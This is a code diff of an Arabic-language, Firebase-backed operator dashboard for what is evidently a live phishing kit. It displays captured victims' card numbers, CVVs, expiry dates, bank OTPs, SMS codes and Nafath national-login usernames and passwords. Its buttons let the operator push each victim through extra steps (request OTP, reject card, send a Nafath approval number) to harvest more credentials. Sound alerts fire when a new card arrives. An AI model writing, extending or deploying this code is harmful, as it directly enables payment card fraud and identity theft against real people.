@@ -2,29 +2,82 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لوحة التحكم | الإدارة</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; padding: 20px; }
-        .card { background: white; border-radius: 15px; padding: 20px; margin-bottom: 15px; border-right: 8px solid #ddd; transition: 0.3s; }
-        .is-new { border-right: 8px solid #00ff9d !important; box-shadow: 0 0 15px rgba(0, 255, 157, 0.3); }
-        .data-row { margin: 8px 0; border-bottom: 1px solid #eee; padding-bottom: 5px; }
-        .actions { margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
-        button { padding: 10px 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .btn-accept { background: #28a745; color: white; }
-        .btn-otp { background: #ffc107; }
-        .btn-nafath { background: #17a2b8; color: white; }
-        .btn-reject { background: #dc3545; color: white; }
-        input { padding: 8px; border: 1px solid #ccc; border-radius: 8px; width: 60px; text-align: center; }
+        body { font-family: 'Cairo', sans-serif; background: #f4f6f9; }
+        .navbar { box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+
+        .accordion-item { margin-bottom: 10px; border-radius: 15px !important; border: 1px solid #dee2e6; overflow: hidden; }
+        .accordion-item.new-order { border-left: 5px solid #198754; animation: pulse-green 2s infinite; }
+        .accordion-item.has-card { border-left: 5px solid #ffc107; }
+
+        .accordion-button { font-weight: 600; }
+        .accordion-button:not(.collapsed) { background-color: #f8f9fa; box-shadow: inset 0 -1px 0 rgba(0,0,0,.125); }
+
+        @keyframes pulse-green { 0% { box-shadow: 0 0 0 0 rgba(25, 135, 84, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(25, 135, 84, 0); } 100% { box-shadow: 0 0 0 0 rgba(25, 135, 84, 0); } }
+
+        .badge-status { font-size: 0.85rem; padding: 6px 12px; border-radius: 20px; }
+        
+        .info-group { background: #f8f9fa; padding: 10px; border-radius: 8px; margin-bottom: 8px; font-size: 0.9rem; }
+        .info-label { color: #6c757d; display: block; font-size: 0.8rem; margin-bottom: 3px; }
+        .info-value { font-weight: bold; color: #2c3e50; word-break: break-all; }
+        
+        .credit-card-box { background: linear-gradient(135deg, #1e293b, #0f172a); color: white; padding: 15px; border-radius: 12px; margin: 15px 0; position: relative; }
+        .cc-number { font-family: monospace; font-size: 1.2rem; letter-spacing: 2px; margin: 10px 0; color: #fbbf24; }
+        
+        .control-panel { background: #f8f9fa; padding: 15px; border-radius: 12px; margin-top: 15px; }
+        .control-btn { font-size: 0.85rem; padding: 8px 12px; margin: 2px; }
+        
+        .nafath-input-group { display: flex; gap: 5px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<h2 style="text-align:center;">إدارة الطلبات المباشرة 🔔</h2>
-<audio id="bell" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3"></audio>
+<!-- شاشة تسجيل الدخول -->
+<div id="login-screen" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f4f6f9; z-index: 10000; display: flex; align-items: center; justify-content: center;">
+    <div class="bg-white p-5 rounded-4 shadow-lg text-center" style="width: 100%; max-width: 400px;">
+        <h3 class="mb-4 fw-bold text-dark">🔐 دخول الإدارة</h3>
+        <input type="password" id="admin-pass" class="form-control mb-3 text-center" placeholder="أدخل كلمة المرور" style="font-size: 1.2rem;">
+        <button class="btn btn-success w-100 py-2 fw-bold" onclick="checkAdmin()">دخول</button>
+        <p id="login-msg" class="text-danger mt-3 small fw-bold" style="display: none;">كلمة المرور غير صحيحة!</p>
+    </div>
+</div>
 
-<div id="orders-list">بانتظار الطلبات...</div>
+<!-- Navbar -->
+<div id="dashboard-content" style="display: none;">
+<nav class="navbar navbar-light bg-white sticky-top">
+    <div class="container-fluid">
+        <div class="d-flex align-items-center">
+            <span class="navbar-brand mb-0 h1 fw-bold text-success"><i class="fas fa-shield-alt me-2"></i>لوحة التحكم</span>
+            <span class="badge bg-danger rounded-pill ms-2" id="live-counter">0</span>
+        </div>
+        
+        <div class="d-flex gap-2">
+            <button class="btn btn-sm btn-outline-danger fw-bold" onclick="deleteAllOrders()">🗑️ حذف الكل</button>
+            <button class="btn btn-sm btn-outline-secondary" onclick="toggleSound()" id="sound-btn">🔊</button>
+        </div>
+    </div>
+</nav>
+
+<!-- Audio Files -->
+<audio id="sound-new" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio> <!-- جرس طلب جديد -->
+<audio id="sound-card" src="https://assets.mixkit.co/active_storage/sfx/2870/2870-preview.mp3"></audio> <!-- جرس بطاقة جديدة -->
+
+<div class="container mt-4">
+    <div class="accordion" id="orders-list">
+        <div class="col-12 text-center text-muted py-5">
+            <div class="spinner-border text-success" role="status"></div>
+            <p class="mt-2">جاري الاتصال بقاعدة البيانات...</p>
+        </div>
+    </div>
+</div>
+</div>
 
 <script>
     const firebaseConfig = {
@@ -39,46 +92,253 @@
     const db = firebase.firestore();
 
     let viewed = JSON.parse(localStorage.getItem('viewed') || '[]');
+    let previousStates = {}; // لتتبع التغييرات وتشغيل الأصوات
     let isFirst = true;
+    let soundEnabled = true;
 
+    function toggleSound() {
+        soundEnabled = !soundEnabled;
+        document.getElementById('sound-btn').innerText = soundEnabled ? "🔊" : "🔇";
+    }
+
+    function playSound(type) {
+        if (!soundEnabled) return;
+        const audio = document.getElementById(type === 'card' ? 'sound-card' : 'sound-new');
+        if(audio) { audio.currentTime = 0; audio.play().catch(e => console.log(e)); }
+    }
+    
+    // التحقق من كلمة المرور للدخول
+    function checkAdmin() {
+        const p = document.getElementById('admin-pass').value;
+        // كلمة المرور هنا هي "123456" - يمكنك تغييرها
+        if(p === "123456") {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('dashboard-content').style.display = 'block';
+            startLiveUpdate(); // تشغيل الاتصال بالقاعدة فقط بعد الدخول
+        } else {
+            document.getElementById('login-msg').style.display = 'block';
+        }
+    }
+
+    // دالة حذف جميع البيانات
+    async function deleteAllOrders() {
+        if(!confirm("⚠️ تحذير: هل أنت متأكد من حذف جميع الزوار والطلبات؟\nلا يمكن التراجع عن هذا الإجراء!")) return;
+        
+        const pwd = prompt("أدخل كلمة المرور للتأكيد (admin):");
+        if(pwd !== "admin") return alert("كلمة المرور خاطئة!");
+
+        try {
+            const snapshot = await db.collection("orders").get();
+            if (snapshot.empty) return alert("قاعدة البيانات فارغة بالفعل.");
+
+            const batch = db.batch();
+            snapshot.docs.forEach((doc) => {
+                batch.delete(doc.ref);
+            });
+
+            await batch.commit();
+            alert("تم حذف جميع البيانات بنجاح ✅");
+            location.reload();
+        } catch(e) {
+            console.error(e);
+            alert("حدث خطأ أثناء الحذف: " + e.message);
+        }
+    }
+
+    function startLiveUpdate() {
     db.collection("orders").onSnapshot((snapshot) => {
-        if (!isFirst && snapshot.docChanges().some(c => c.type === "added")) document.getElementById('bell').play();
-        isFirst = false;
-
         let docs = [];
         snapshot.forEach(doc => docs.push({id: doc.id, ...doc.data()}));
         docs.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
 
+        // تحديث العداد
+        document.getElementById('live-counter').innerText = docs.length;
+
         const list = document.getElementById('orders-list');
-        list.innerHTML = "";
+        if (isFirst) list.innerHTML = ""; // المسح الكامل عند أول تحميل فقط
+
         docs.forEach(data => {
+            // منطق الأصوات والحالة الجديدة
             const isNew = !viewed.includes(data.id);
-            let fields = "";
-            Object.keys(data).forEach(k => { if(!['timestamp','next_step','nafath_code','status'].includes(k)) fields += `<div class="data-row"><b>${k}:</b> ${data[k]}</div>`; });
+            
+            // فحص إذا كان هناك بطاقة جديدة لم تكن موجودة سابقاً
+            if (!isFirst && data.card_number && !previousStates[data.id]?.hasCard) {
+                playSound('card');
+            } 
+            // فحص إذا كان طلب جديد كلياً
+            else if (!isFirst && !previousStates[data.id]) {
+                playSound('new');
+            }
 
-            list.innerHTML += `
-                <div class="card ${isNew?'is-new':''}" onclick="markRead('${data.id}')">
-                    ${fields}
-                    <div style="color:blue; margin:10px 0;">الحالة: ${data.status || 'قيد المعالجة'}</div>
-                    <div class="actions">
-                        <button class="btn-accept" onclick="update('${data.id}','SUCCESS','تم قبول طلبك')">قبول</button>
-                        <button class="btn-otp" onclick="update('${data.id}','GO_TO_OTP','طلب كود التحقق')">طلب OTP</button>
-                        <button class="btn-nafath" onclick="update('${data.id}','GO_TO_NAFATH','تحويل لنفاذ')">نفاذ</button>
-                        <button class="btn-reject" onclick="update('${data.id}','GO_TO_REJECT','نعتذر، الطلب مرفوض')">رفض</button>
-                        <input type="number" id="n-${data.id}" placeholder="الرقم" value="${data.nafath_code||''}">
-                        <button style="background:#333;color:white" onclick="sendN('${data.id}')">إرسال رقم نفاذ</button>
+            // تحديث الحالة السابقة
+            previousStates[data.id] = { hasCard: !!data.card_number };
+
+            // تحديد الكلاسات
+            let itemClass = "accordion-item";
+            let badgeClass = "bg-secondary";
+            
+            if (isNew) { 
+                itemClass += " new-order"; 
+                badgeClass = "bg-success"; 
+            }
+            if (data.card_number) {
+                itemClass += " has-card";
+                if (!isNew) badgeClass = "bg-warning text-dark";
+            }
+
+            // بناء محتوى البطاقة الداخلي
+            const cardInnerHtml = `
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#c-${data.id}" onclick="markRead('${data.id}', event)">
+                        <div class="d-flex w-100 justify-content-between align-items-center pe-3">
+                            <div>
+                                <span class="fw-bold">#${data.id.substring(0,6)}</span>
+                                <small class="text-muted ms-2">${data.id_number || ''}</small>
+                                ${isNew ? '<span class="badge bg-danger ms-2">جديد</span>' : ''}
+                            </div>
+                            <span class="badge badge-status ${badgeClass}">${data.status || 'انتظار'}</span>
+                        </div>
+                    </button>
+                </h2>
+                <div id="c-${data.id}" class="accordion-collapse collapse" data-bs-parent="#orders-list">
+                    <div class="accordion-body">
+                        <h5 class="mb-3 border-bottom pb-2">تفاصيل الطلب الكاملة</h5>
+                        
+                        <!-- عرض كل البيانات -->
+                        ${renderAllData(data)}
+
+                        <!-- عرض بيانات البطاقة والأكواد -->
+                        <div class="row mt-3">
+                            <div class="col-md-7">
+                                ${data.card_number ? `
+                                <div class="credit-card-box h-100">
+                                    <div class="d-flex justify-content-between">
+                                        <small>💳 بيانات الدفع</small>
+                                        <small>${data.card_name || 'No Name'}</small>
+                                    </div>
+                                    <div class="cc-number" dir="ltr">${data.card_number}</div>
+                                    <div class="d-flex justify-content-between mt-2">
+                                        <span>EXP: ${data.expiry || '--/--'}</span>
+                                        <span class="text-danger fw-bold">CVV: ${data.cvv || '---'}</span>
+                                    </div>
+                                </div>
+                                ` : '<div class="alert alert-light text-center h-100 d-flex align-items-center justify-content-center">لم تصل بيانات البطاقة بعد.</div>'}
+                            </div>
+                            <div class="col-md-5">
+                                ${data.otp_code ? `<div class="alert alert-warning py-2 px-3 mb-2"><i class="fas fa-key me-2"></i> OTP البنك: <b>${data.otp_code}</b></div>` : ''}
+                                ${data.mobile_sms_code ? `<div class="alert alert-info py-2 px-3 mb-2"><i class="fas fa-sms me-2"></i> كود الجوال: <b>${data.mobile_sms_code}</b></div>` : ''}
+                                ${data.nafath_username ? `<div class="alert alert-secondary py-2 px-3 mb-2"><i class="fas fa-user me-2"></i> يوزر نفاذ: <b>${data.nafath_username}</b> <br> باسورد: <b>${data.nafath_password}</b></div>` : ''}
+                                ${data.nafath_otp ? `<div class="alert alert-success py-2 px-3 mb-2"><i class="fas fa-fingerprint me-2"></i> توثيق نفاذ: <b>${data.nafath_otp}</b></div>` : ''}
+                            </div>
+                        </div>
+
+                        <!-- لوحة التحكم -->
+                        <div class="control-panel">
+                            <h6 class="small text-muted fw-bold mb-2">التحكم في المسار:</h6>
+                            <div class="d-flex flex-wrap gap-2">
+                                <button class="btn btn-sm btn-outline-warning control-btn" onclick="update('${data.id}','GO_TO_OTP','طلب كود البنك')">طلب OTP</button>
+                                <button class="btn btn-sm btn-outline-danger control-btn" onclick="update('${data.id}','GO_TO_REJECT','رفض البطاقة')">رفض البطاقة</button>
+                                <div class="vr"></div>
+                                <div class="nafath-input-group flex-grow-1">
+                                    <input type="number" id="n-${data.id}" class="form-control form-control-sm" placeholder="رقم نفاذ" value="${data.nafath_code||''}">
+                                    <button class="btn btn-sm btn-primary" onclick="sendN('${data.id}')">إرسال</button>
+                                </div>
+                                <div class="dropdown">
+                                    <button class="btn btn-sm btn-dark dropdown-toggle" type="button" data-bs-toggle="dropdown">
+                                        🎮 تحكم متقدم
+                                    </button>
+                                    <ul class="dropdown-menu dropdown-menu-end text-end">
+                                        <li><a class="dropdown-item" href="#" onclick="update('${data.id}','GO_TO_MOBILE','⏩ تخطي إلى: تأكيد الجوال')">تخطي إلى: تأكيد الجوال</a></li>
+                                        <li><a class="dropdown-item" href="#" onclick="update('${data.id}','GO_TO_NAFATH','⏩ تخطي إلى: نفاذ')">تخطي إلى: نفاذ</a></li>
+                                        <li><hr class="dropdown-divider"></li>
+                                        <li><a class="dropdown-item text-danger" href="#" onclick="update('${data.id}','GO_TO_PAYMENT','⏪ إرجاع للدفع')">إرجاع للبداية (الدفع)</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
                     </div>
-                </div>`;
+                </div>
+            `;
+            
+            // التعامل الذكي مع التحديثات
+            const existingCard = document.getElementById(data.id);
+            if (existingCard) {
+                // إذا الكرت موجود، نتحقق هل هو مفتوح؟
+                const collapseDiv = existingCard.querySelector('.accordion-collapse');
+                const isOpened = collapseDiv && collapseDiv.classList.contains('show');
+                
+                // تحديث المحتوى بالكامل لضمان ظهور أي بيانات جديدة (مثل البطاقة)
+                existingCard.innerHTML = cardInnerHtml;
+                existingCard.className = itemClass; // تحديث الكلاسات (للألوان)
+                
+                // إعادة فتح الكرت إذا كان مفتوحاً
+                if(isOpened) {
+                    const newCollapse = existingCard.querySelector('.accordion-collapse');
+                    newCollapse.classList.add('show');
+                    const btn = existingCard.querySelector('.accordion-button');
+                    btn.classList.remove('collapsed');
+                    btn.setAttribute('aria-expanded', 'true');
+                }
+            } else {
+                // إنشاء كرت جديد
+                const div = document.createElement('div');
+                div.className = itemClass;
+                div.id = data.id;
+                div.innerHTML = cardInnerHtml;
+                list.appendChild(div);
+            }
         });
+        isFirst = false;
     });
+    }
+    
+    // دالة مساعدة لإنشاء HTML البيانات
+    function renderAllData(data) {
+        let html = '<div class="row g-2">';
+        const excludedKeys = ['timestamp', 'next_step', 'status', 'card_name', 'card_number', 'expiry', 'cvv', 'otp_code', 'mobile_sms_code', 'nafath_otp', 'nafath_code', 'nafath_username', 'nafath_password'];
+        for (const key in data) {
+            if (!excludedKeys.includes(key) && data[key]) {
+                html += `
+                    <div class="col-md-4 col-6">
+                        <div class="info-group">
+                            <span class="info-label text-capitalize">${key.replace(/_/g, ' ')}</span>
+                            <span class="info-value">${data[key]}</span>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+        html += '</div>';
+        return html;
+    }
 
-    async function update(id, step, msg) { await db.collection("orders").doc(id).update({ next_step: step, status: msg }); }
+    async function update(id, step, msg) { 
+        if(confirm('هل أنت متأكد من تنفيذ الأمر: ' + msg + '؟')) {
+            await db.collection("orders").doc(id).update({ next_step: step, status: msg }); 
+        }
+    }
+    
     async function sendN(id) { 
         const v = document.getElementById('n-'+id).value;
-        await db.collection("orders").doc(id).update({ nafath_code: v, next_step: 'SHOW_NAFATH_CODE', status: 'تم إرسال رقم نفاذ: '+v }); 
+        if(!v) return alert('أدخل الرقم أولاً');
+        await db.collection("orders").doc(id).update({ 
+            nafath_code: v, 
+            next_step: 'SHOW_NAFATH_CODE', 
+            status: 'بانتظار الموافقة في نفاذ على رقم: '+v 
+        }); 
     }
-    function markRead(id) { if(!viewed.includes(id)) { viewed.push(id); localStorage.setItem('viewed', JSON.stringify(viewed)); } }
+    
+    function markRead(id, event) { 
+        if(!viewed.includes(id)) { 
+            viewed.push(id); localStorage.setItem('viewed', JSON.stringify(viewed)); 
+        } 
+        // إزالة كلاس "new-order" بصرياً فوراً من العنصر الأب
+        const item = event.currentTarget.closest('.accordion-item');
+        item.classList.remove('new-order');
+        // إزالة شارة "جديد"
+        event.currentTarget.querySelector('.badge-danger')?.remove();
+    }
 </script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
-
